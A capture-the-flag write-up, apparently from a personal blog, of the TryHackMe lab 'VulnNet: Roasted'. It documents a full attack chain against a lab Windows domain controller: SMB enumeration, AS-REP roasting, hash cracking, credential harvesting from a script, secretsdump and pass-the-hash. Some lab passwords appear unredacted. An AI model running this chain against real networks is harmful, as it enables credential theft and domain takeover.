---
title: "VulnNet Roasted"
date: 2025-03-16
image: /assets/img/general/CTFgeneral_image.jpg
description: Writeup of the TryHackMe-CTF VulnNet Roasted
categories: [TryHackMe, Easy]
tags: [windows, impacket, crackmapexec, smb]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>VulnNet: Roasted</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>VulnNet Entertainment quickly deployed another management instance on their very broad network...</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Windows</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/vulnnetroasted">https://tryhackme.com/room/vulnnetroasted</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge VulnNet: Roasted.  

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -Pn -p- 10.10.97.172
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-16 05:58 EST
  Nmap scan report for 10.10.97.172
  Host is up (0.042s latency).
  Not shown: 65515 filtered tcp ports (no-response)
  PORT      STATE SERVICE
  53/tcp    open  domain
  88/tcp    open  kerberos-sec
  135/tcp   open  msrpc
  139/tcp   open  netbios-ssn
  389/tcp   open  ldap
  445/tcp   open  microsoft-ds
  464/tcp   open  kpasswd5
  593/tcp   open  http-rpc-epmap
  636/tcp   open  ldapssl
  3268/tcp  open  globalcatLDAP
  3269/tcp  open  globalcatLDAPssl
  5985/tcp  open  wsman
  9389/tcp  open  adws
  49665/tcp open  unknown
  49667/tcp open  unknown
  49669/tcp open  unknown
  49670/tcp open  unknown
  49677/tcp open  unknown
  49691/tcp open  unknown
  49707/tcp open  unknown

  Nmap done: 1 IP address (1 host up) scanned in 134.14 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -Pn -p 53,88,135,139,445,464,593,636,3268,3269,5985,9389 10.10.97.172
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-16 06:02 EST
  Nmap scan report for 10.10.97.172
  Host is up (0.075s latency).

  PORT     STATE SERVICE       VERSION
  53/tcp   open  domain        Simple DNS Plus
  88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-15 11:02:26Z)
  135/tcp  open  msrpc         Microsoft Windows RPC
  139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
  445/tcp  open  microsoft-ds?
  464/tcp  open  kpasswd5?
  593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
  636/tcp  open  tcpwrapped
  3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
  3269/tcp open  tcpwrapped
  5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
  |_http-server-header: Microsoft-HTTPAPI/2.0
  |_http-title: Not Found
  9389/tcp open  mc-nmf        .NET Message Framing
  Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

  Host script results:
  | smb2-security-mode: 
  |   3:1:1: 
  |_    Message signing enabled and required
  | smb2-time: 
  |   date: 2025-02-15T11:02:31
  |_  start_date: N/A
  |_clock-skew: -8s

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 50.75 seconds
```
From here I proceeded the analysis port by port. The open ports indicated that this is likely a domain controller.

## Port 445 Analysis

I began the analysis using the tool `enum4linux`, but didn't find anything useful beside the domain name:
```bash
[...]
Domain Name: VULNNET-RST                                                           
Domain Sid: S-1-5-21-1589833671-435344116-4136949213
[...]
```

Since we were dealing with a Windows machine, I enumerated potential shares and found two that I decided to analyzed further:
```bash
$ smbclient -N -L \\10.10.97.172   

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        VulnNet-Business-Anonymous Disk      VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous Disk      VulnNet Enterprise Sharing

$ smbclient -N \\\\10.10.97.172\\VulnNet-Business-Anonymous 
  Try "help" to get a list of possible commands.
  smb: \> dir
    .                                   D        0  Fri Mar 12 21:46:40 2021
    ..                                  D        0  Fri Mar 12 21:46:40 2021
    Business-Manager.txt                A      758  Thu Mar 11 20:24:34 2021
    Business-Sections.txt               A      654  Thu Mar 11 20:24:34 2021
    Business-Tracking.txt               A      471  Thu Mar 11 20:24:34 2021
  
$ smbclient -N \\\\10.10.97.172\\VulnNet-Enterprise-Anonymous
  Try "help" to get a list of possible commands.
  smb: \> dir
    .                                   D        0  Fri Mar 12 21:46:40 2021
    ..                                  D        0  Fri Mar 12 21:46:40 2021
    Enterprise-Operations.txt           A      467  Thu Mar 11 20:24:34 2021
    Enterprise-Safety.txt               A      503  Thu Mar 11 20:24:34 2021
    Enterprise-Sync.txt                 A      496  Thu Mar 11 20:24:34 2021
```

I downloaded the files which contained work guidelines and responsibilities within the company. Since this could be a domain controller, I collected all the names that could potentially be domain usernames. Next, the SMB share can provided more insights into potential usernames using `impacket-lookupsid`. Since I was able to interact with the shares without credentials, I tried the guest account:
```bash
$ impacket-lookupsid vulnnet-rst.local/guest@10.10.208.124
  Impacket v0.12.0.dev1 - Copyright 2023 Fortra

  Password:
  [*] Brute forcing SIDs at 10.10.208.124
  [*] StringBinding ncacn_np:10.10.208.124[\pipe\lsarpc]
  [*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
  498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
  500: VULNNET-RST\Administrator (SidTypeUser)
  501: VULNNET-RST\Guest (SidTypeUser)
  502: VULNNET-RST\krbtgt (SidTypeUser)
  512: VULNNET-RST\Domain Admins (SidTypeGroup)
  513: VULNNET-RST\Domain Users (SidTypeGroup)
  514: VULNNET-RST\Domain Guests (SidTypeGroup)
  515: VULNNET-RST\Domain Computers (SidTypeGroup)
  516: VULNNET-RST\Domain Controllers (SidTypeGroup)
  517: VULNNET-RST\Cert Publishers (SidTypeAlias)
  518: VULNNET-RST\Schema Admins (SidTypeGroup)
  519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
  520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
  521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
  522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
  525: VULNNET-RST\Protected Users (SidTypeGroup)
  526: VULNNET-RST\Key Admins (SidTypeGroup)
  527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
  553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
  571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
  572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
  1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
  1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
  1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
  1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
  1105: VULNNET-RST\a-whitehat (SidTypeUser)
  1109: VULNNET-RST\t-skid (SidTypeUser)
  1110: VULNNET-RST\j-goldenhand (SidTypeUser)
  1111: VULNNET-RST\j-leet (SidTypeUser)
```

After compiling a list of valid usernames, I checked for AS-REP roastable accounts using `impacket-GetNPUsers`. Before doing this, I had to add the domain and IP address of the server to my hosts file:
```bash
$ impacket-GetNPUsers vulnnet-rst.local/ -no-pass -usersfile usernames.txt 
  Impacket v0.12.0.dev1 - Copyright 2023 Fortra

  [-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
  $krb5asrep$23$t-skid@VULNNET-RST.LOCAL:34ec00f00abbbfdbbd5aeeac93df9f6a$27880a39e719fbec4072897d4251e3460952594eae70b9f038020fd4d00830c75f58caae7fc92988251936367faab769ad07ecc31c7da570410a0c475edb8651e336088000546c1c436fb7fe7df1eec3cd9257dcf348685e1a90cdb46b42e152a72f86d5839f50f5842500d8df2988cc1a50d2d7114a8a95dc35a3f8a125899110430f27f637d001f7f7f14f29716374d9c6a920d886bb68c8101c00761802201fb7e07c887ff932df0f4377a1bc94e3df8bddf42d3d002386f3e0cda9d1b9b11bf200391850a306e035cba871c8c9c8ce14ed3e848459d69e8f261991ecb208ab7f6a35f2a95b07b65bc98282c1951538ec74f15d92
  [-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
  [-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Great! Once I obtained a hash value, I attempted to crack it using `john`:
```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
  Using default input encoding: UTF-8
  Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])
  Will run 8 OpenMP threads
  Press 'q' or Ctrl-C to abort, almost any other key for status
  t[removed]*        ($krb5asrep$23$t-skid@VULNNET-RST.LOCAL)     
  1g 0:00:00:01 DONE (2025-02-15 07:56) 0.8695g/s 2763Kp/s 2763Kc/s 2763KC/s tk072155167..tj0216044
  Use the "--show" option to display all of the cracked passwords reliably
  Session completed.
```

With the credentials I found, I started another share enumeration, but I had no success. Therefore, I initiated another scan using `crackmapexec`:
```bash
$ crackmapexec smb 10.10.185.116 -u t-skid -p "t[removed]*" -M spider_plus
  SMB         10.10.185.116   445    WIN-2BO8M1OE1M1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
  SMB         10.10.185.116   445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\t-skid:tj072889* 
  SPIDER_P... 10.10.185.116   445    WIN-2BO8M1OE1M1  [*] Started spidering plus with option:
  SPIDER_P... 10.10.185.116   445    WIN-2BO8M1OE1M1  [*]        DIR: ['print$']
  SPIDER_P... 10.10.185.116   445    WIN-2BO8M1OE1M1  [*]        EXT: ['ico', 'lnk']
  SPIDER_P... 10.10.185.116   445    WIN-2BO8M1OE1M1  [*]       SIZE: 51200
  SPIDER_P... 10.10.185.116   445    WIN-2BO8M1OE1M1  [*]     OUTPUT: /tmp/cme_spider_plus
  [...]
  "NETLOGON": {
          "ResetPassword.vbs": {
              "atime_epoch": "2021-03-16 19:18:14",
              "ctime_epoch": "2021-03-16 19:15:49",
              "mtime_epoch": "2021-03-16 19:18:14",
              "size": "2.75 KB"
          }
```

The output revealed an interesting file, which caught my attention. I downloaded it afterward using smbclient. The file revealed additional credentials:
```bash
$ smbclient \\\\10.10.185.116\\NETLOGON -U vulnnet-rst.local/t-skid 
  Password for [VULNNET-RST.LOCAL\t-skid]:
  Try "help" to get a list of possible commands.
  smb: \> dir
    .                                   D        0  Tue Mar 16 19:15:49 2021
    ..                                  D        0  Tue Mar 16 19:15:49 2021
    ResetPassword.vbs                   A     2821  Tue Mar 16 19:18:14 2021

$ cat ResetPassword.vbs
  [...]
  strUserNTName = "a-whitehat"
  strPassword = "b[removed]t"
  [...]
```

I tested the credentials again with `crackmapexec`:
```bash
$ crackmapexec smb 10.10.185.116 -u a-whitehat -p "b[removed]t"           
SMB         10.10.185.116   445    WIN-2BO8M1OE1M1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
SMB         10.10.185.116   445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\a-whitehat:bNdKVkjv3RR9ht (Pwn3d!)

```

Great! I got a `Pwn3d!` response, indicating that I was able to get a shell using `impacket-wmiexec`, and I successfully retrieved the user flag:
```bash
$ impacket-wmiexec  vulnnet-rst.local/a-whitehat@10.10.185.116 
  Impacket v0.12.0.dev1 - Copyright 2023 Fortra

  Password:
  [*] SMBv3.0 dialect used
  [!] Launching semi-interactive shell - Careful what you execute
  [!] Press help for extra shell commands
C:\>whoami
  vulnnet-rst\a-whitehat

C:\>hostname
  WIN-2BO8M1OE1M1

C:\Users\enterprise-core-vn\Desktop>type user.txt
  THM{[removed]]}
```

## Privilege Escalation Administrator

I procceded by checking the permissions for the user `a-whitehat` on the server:
```bash
C:\Users\enterprise-core-vn\Desktop>whoami /groups


  GROUP INFORMATION
  -----------------

  Group Name                                         Type             SID                                          Attributes                                                     
  ================================================== ================ ============================================ ===============================================================
  Everyone                                           Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group             
  BUILTIN\Users                                      Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group             
  BUILTIN\Pre-Windows 2000 Compatible Access         Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group             
  BUILTIN\Administrators                             Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
  NT AUTHORITY\NETWORK                               Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group             
  NT AUTHORITY\Authenticated Users                   Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group             
  NT AUTHORITY\This Organization                     Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group             
  VULNNET-RST\Domain Admins                          Group            S-1-5-21-1589833671-435344116-4136949213-512 Mandatory group, Enabled by default, Enabled group             
  VULNNET-RST\Denied RODC Password Replication Group Alias            S-1-5-21-1589833671-435344116-4136949213-572 Mandatory group, Enabled by default, Enabled group, Local Group
  NT AUTHORITY\NTLM Authentication                   Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group             
  Mandatory Label\High Mandatory Level               Label            S-1-16-12288
```

Great! The user is member of the domain admin group, meaning I should be able to dump the `administrator` hash unsing `impacket-secretsdump`:
```bash
$ impacket-secretsdump vulnnet-rst.local/a-whitehat@10.10.185.116
  Impacket v0.12.0.dev1 - Copyright 2023 Fortra

  Password:
  [*] Service RemoteRegistry is in stopped state
  [*] Starting service RemoteRegistry
  [*] Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a
  [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
  Administrator:500:aa[removed]ee:c2[removed]09d:::
  Guest:501:aa[removed]ee:31[removed]c0:::
  DefaultAccount:503:aa[removed]ee:31[removed]c0:::
  [-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
  [*] Dumping cached domain logon information (domain/username:hash)
  [*] Dumping LSA Secrets
  [*] $MACHINE.ACC 
  VULNNET-RST\WIN-2BO8M1OE1M1$:aes256-cts-hmac-sha1-96:6a4174ca9dea5402dcd48c64b1f2e3981e7c10fe3364c6f378445dc9d2a4ba33                                             
  VULNNET-RST\WIN-2BO8M1OE1M1$:aes128-cts-hmac-sha1-96:0311cbb31013e0c13df1d65861c0f867                                                                             
  VULNNET-RST\WIN-2BO8M1OE1M1$:des-cbc-md5:6e7a76f457ec1023                                                                                                         
  VULNNET-RST\WIN-2BO8M1OE1M1$:plain_password_hex:a[removed]e1                                                                                                                        
  VULNNET-RST\WIN-2BO8M1OE1M1$:aa[removed]ee:3f7b392bda784f88731141d45de10327:::                                                                 
  [*] DPAPI_SYSTEM
  [...]
```

By passing the hash, I was able to log in as `administrator` and retrieved the system flag:
```bash
$ impacket-wmiexec vulnnet-rst.local/administrator@10.10.185.116 -hashes aa[removed]ee:c2[removed]9d
  Impacket v0.12.0.dev1 - Copyright 2023 Fortra

  [*] SMBv3.0 dialect used
  [!] Launching semi-interactive shell - Careful what you execute
  [!] Press help for extra shell commands
  C:\>cd Users/Administrator/Desktop
  C:\Users\Administrator\Desktop>type system.txt
  THM{[removed]}
```

solved! :)